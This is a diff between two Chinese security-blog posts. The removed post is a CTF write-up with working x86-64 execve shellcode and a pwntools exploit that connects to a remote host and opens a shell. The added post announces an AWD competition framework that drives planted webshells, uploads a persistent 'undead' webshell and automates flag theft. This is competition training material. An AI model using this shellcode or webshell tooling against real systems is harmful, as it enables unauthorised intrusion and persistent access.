@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="pwn，CTF,">
+  <meta name="keywords" content="项目,">
 
 
 
@@ -86,23 +86,20 @@
 
 
 
-<meta name="description" content="这里以前几天碰到的hgame2019的一道pwn题目为例  程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错  我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) {   char buf[92]; // [rsp+0">
-<meta name="keywords" content="pwn，CTF">
+<meta name="description" content="花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数 框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug 下面简要介绍框架的使用方法和基本流程： 命令集合： Command          Tips -------       ----------- addip         添加she">
+<meta name="keywords" content="项目">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn之shellcode编写">
-<meta property="og:url" content="https://yml-sec.top/2019/01/29/pwn之shellcode编写/index.html">
+<meta property="og:title" content="置顶-项目发布-YML-AWD-FRAMEWORK">
+<meta property="og:url" content="https://yml-sec.top/2019/02/17/置顶-项目发布-YML-AWD-FRAMEWORK/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="这里以前几天碰到的hgame2019的一道pwn题目为例  程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错  我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) {   char buf[92]; // [rsp+0">
+<meta property="og:description" content="花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数 框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug 下面简要介绍框架的使用方法和基本流程： 命令集合： Command          Tips -------       ----------- addip         添加she">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/u4zp48g.jpg">
-<meta property="og:image" content="https://i.imgur.com/cQf0KhA.jpg">
-<meta property="og:image" content="https://i.imgur.com/A5ZS5rv.jpg">
-<meta property="og:image" content="https://i.imgur.com/07D732R.jpg">
-<meta property="og:updated_time" content="2019-01-29T12:47:22.916Z">
+<meta property="og:image" content="https://i.imgur.com/cAF95An.gif">
+<meta property="og:updated_time" content="2019-02-17T10:19:11.650Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn之shellcode编写">
-<meta name="twitter:description" content="这里以前几天碰到的hgame2019的一道pwn题目为例  程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错  我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) {   char buf[92]; // [rsp+0">
-<meta name="twitter:image" content="https://i.imgur.com/u4zp48g.jpg">
+<meta name="twitter:title" content="置顶-项目发布-YML-AWD-FRAMEWORK">
+<meta name="twitter:description" content="花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数 框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug 下面简要介绍框架的使用方法和基本流程： 命令集合： Command          Tips -------       ----------- addip         添加she">
+<meta name="twitter:image" content="https://i.imgur.com/cAF95An.gif">
 
 
 
@@ -132,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/29/pwn之shellcode编写/">
+  <link rel="canonical" href="https://yml-sec.top/2019/02/17/置顶-项目发布-YML-AWD-FRAMEWORK/">
 
 
 
 
 
-  <title>pwn之shellcode编写 | yemoli's blog</title>
+  <title>置顶-项目发布-YML-AWD-FRAMEWORK | yemoli's blog</title>
   
 
 
@@ -264,7 +261,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/29/pwn之shellcode编写/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/17/置顶-项目发布-YML-AWD-FRAMEWORK/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -281,7 +278,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn之shellcode编写</h1>
+          <h1 class="post-title" itemprop="name headline">置顶-项目发布-YML-AWD-FRAMEWORK</h1>
         
 
         <div class="post-meta">
@@ -293,8 +290,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-29T20:26:56+08:00">
-                2019-01-29
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-17T16:55:15+08:00">
+                2019-02-17
               </time>
             
 
@@ -325,7 +322,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  422
+                  896
                 </span>
               
 
@@ -341,7 +338,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  2
+                  3
                 </span>
               
             </div>
@@ -362,58 +359,87 @@
       
 
       
-        <p>这里以前几天碰到的hgame2019的一道pwn题目为例</p>
-<p><img src="https://i.imgur.com/u4zp48g.jpg" alt=""></p>
-<p>程序直接就给了输入点，我们拖入到ida查看</p>
-<p>这是一个64位程序，我们正常在main函数处f5反编译时出现了报错</p>
-<p><img src="https://i.imgur.com/cQf0KhA.jpg" alt=""></p>
-<p>我们选中报错那行代码按d，即可正常反编译</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char buf[92]; // [rsp+0h] [rbp-60h]
-  int i; // [rsp+5Ch] [rbp-4h]
-
-  signal(14, handle);
-  alarm(0xAu);
-  read(0, buf, 0x50uLL);
-  for ( i = 0; i &lt;= 79; ++i )
-  buf[i] ^= i + 1;
-  JUMPOUT(*(_QWORD *)&amp;byte_400672);
-}
-</code></pre><p>改程序直接调用了我们输入的shellcode，但是注意在</p>
-<pre><code>for ( i = 0; i &lt;= 79; ++i )
-buf[i] ^= i + 1;
-</code></pre><p>这里他将我们输入的shellcode和i+1进行了异或，所以我们需要将我们的shellcode与i+1进行异或后再发送给程序</p>
-<p>关于shellcode，我们不会编写的话可以去公共数据库寻找合适的shellcode </p>
-<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>
-<p><img src="https://i.imgur.com/A5ZS5rv.jpg" alt=""></p>
-<p>这里我使用了一位师傅分享的shellcode</p>
-<p>我们先将其与i+1进行异或运算</p>
-<pre><code>buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot;
-m = &quot;&quot;
-for i in range(0,34):
-    m = m+chr(ord(buf[i])^(i+1))
-</code></pre><p>而后将其整合在最后的exp中：</p>
-<pre><code>from pwn import *
-context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)
-
-
-p = remote(&apos;118.24.3.214&apos;,10000)
-#p = process(&apos;./babysc&apos;)
-
-
-buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot;
-m = &quot;&quot;
-
-for i in range(0,34):
-    m = m+chr(ord(buf[i])^(i+1))
-
-
-p.send(m)
-
-p.interactive()
-</code></pre><p>执行后成功获得了权限</p>
-<p><img src="https://i.imgur.com/07D732R.jpg" alt=""></p>
+        <p>花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数</p>
+<p>框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug</p>
+<p>下面简要介绍框架的使用方法和基本流程：</p>
+<p>命令集合：</p>
+<pre><code>Command          Tips
+-------       -----------
+addip         添加shell ip和端口
+addshell      添加shell路径
+saveshell     保存shell到文件
+showip        查看ip列表
+removeip      移除某个ip
+clearip       清除ip列表
+saveip        将ip保存到文件
+updead        上传bash不死马文件(.crons.php)
+loadip        加载储存的IP列表
+loadwebshell  加载储存的shell列表
+liuliang      进行流量混淆(请先添加ip或loadip)
+addflagshell  添加获取flag的shell
+saveflagshell 将获取flag的shell储存到文件
+loadflagshell 加载储存的flagshell列表
+getflag       获取flag(demo: getflag-cat /flag  注意分隔符是&quot;-&quot;)
+exit          退出
+</code></pre><p>添加ip时需要添加ip地址和端口号，分割符为空格，两者皆支持范围添加，例如下面的例子</p>
+<pre><code>addip 10.10.10.10 80
+addip 10.10.10.10-19 80
+addip 10.10.10.10 80-90
+</code></pre><p>removeip 可以删除掉自己机器的ip地址</p>
+<p>确认ip地址无误后，可以通过saveip将其保存下来</p>
+<p>addshell命令可以添加对方机器上的预留shell，支持get和post格式，已下是输入例子</p>
+<pre><code>addshell /a.php c post
+addshell /a.php c get
+</code></pre><p>其中c为a.php的密码</p>
+<p>添加完成后通过saveshell保存下来</p>
+<p>如果希望维持权限，可以通过Updead上传不死马文件</p>
+<p>flagshell是特定的shell文件，因为用Python去实现菜刀的功能很麻烦，所以获取flag 暂时通过命令执行的方式进行获取,添加flagshell的语法和addshell一样</p>
+<p>getflag需要附带获取flag的命令，添加后会提示输入提交flag的地址，这时需要用yml-flag来代替flag当做命令输入，如下图的演示</p>
+<p><img src="https://i.imgur.com/cAF95An.gif" alt=""></p>
+<p>这样就可以进行自动获取和提交了</p>
+<p>关于流量混淆模块：</p>
+<p>本人项目是在E盘写的，所以要正常使用该模块需要放在E盘下，并将站点源码放入html目录</p>
+<p>为了程序更好的兼容，将程序打包成了exe可执行程序，无需安装Python环境即可使用</p>
+<p>该版本程序加了注册码，过后会考虑开放全部源码</p>
+<p>下面分享项目部分函数代码</p>
+<p>网络收集部分:</p>
+<p>ip列表：</p>
+<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_list</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> ipList</span><br><span class="line">    iplist = x.split(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'-'</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> iplist:</span><br><span class="line">            d = i</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'-'</span> <span class="keyword">in</span> d:</span><br><span class="line">                p = iplist.index(d)</span><br><span class="line">                l = d.split(<span class="string">'-'</span>)</span><br><span class="line">                m = int(l[<span class="number">0</span>])</span><br><span class="line">                n = int(l[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(m,n + <span class="number">1</span>):</span><br><span class="line">            iplist[p] = str(j)</span><br><span class="line">            ip = <span class="string">'.'</span>.join(iplist)</span><br><span class="line">            ipList.append(ip)</span><br><span class="line">        ipList = sorted(set(ipList),key = ipList.index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip = <span class="string">'.'</span>.join(iplist)</span><br><span class="line">        ipList.append(ip)</span><br><span class="line">        ipList = sorted(set(ipList),key = ipList.index)</span><br><span class="line">    <span class="keyword">return</span> ipList</span><br></pre></td></tr></table></figure>
+</code></pre><p>自写核心部分</p>
+<p>流量混淆模块获取源码：</p>
+<pre><code>def attack_ll():
+    path = &apos;E:\YML-AWD-FRAMEWORK\html&apos;
+    global pathList
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            tmp_path = root.replace(path, &quot;&quot;)
+            tmp_path = tmp_path.replace(&quot;\\&quot;, &quot;/&quot;)
+            tmp_path2 = tmp_path + &quot;/&quot; + name
+            pathList.append(tmp_path2)
+        for name in dirs:
+            tmp_path = root.replace(path, &quot;&quot;)
+            tmp_path = tmp_path.replace(&quot;\\&quot;, &quot;/&quot;)
+            tmp_path2 = tmp_path + &quot;/&quot; + name
+            pathList.append(tmp_path2)
+    return pathList
+</code></pre><p>flag存储模块：</p>
+<pre><code>def save_flag():
+    global flag
+    global flag_str
+    flag = list(set(flag))
+    try:
+        flag.remove(0)
+    except:
+        pass
+    print(flag)
+    flag_str = &quot;&quot;
+    for i in flag:
+        flag_str = flag_str+i+&quot;\n&quot;
+    f = open(&apos;data/flag.txt&apos;, &apos;w+&apos;)
+    f.write(flag_str)
+    f.close()
+</code></pre><p>项目地址：<a href="https://github.com/yemoli/YML-AWD-FRAMEWORK" target="_blank" rel="noopener">https://github.com/yemoli/YML-AWD-FRAMEWORK</a></p>
+<p>百度网盘下载：链接：<a href="https://pan.baidu.com/s/1eBTCAFrRbpAYcNuFCqVkKA" target="_blank" rel="noopener">https://pan.baidu.com/s/1eBTCAFrRbpAYcNuFCqVkKA </a><br>提取码：kopf </p>
 
       
     </div>
@@ -460,7 +486,7 @@ p.interactive()
       
         <div class="post-tags">
           
-            <a href="/tags/pwn，CTF/" rel="tag"># pwn，CTF</a>
+            <a href="/tags/项目/" rel="tag"># 项目</a>
           
         </div>
       
@@ -473,8 +499,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/28/CTF中常出现的PHP函数/" rel="next" title="CTF中常出现的PHP函数">
-                <i class="fa fa-chevron-left"></i> CTF中常出现的PHP函数
+              <a href="/2019/02/16/python实现进度条/" rel="next" title="python实现进度条">
+                <i class="fa fa-chevron-left"></i> python实现进度条
               </a>
             
           </div>
@@ -482,10 +508,6 @@ p.interactive()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/30/RedHat-2017-pwn1题目复现/" rel="prev" title="RedHat 2017-pwn1题目复现">
-                RedHat 2017-pwn1题目复现 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
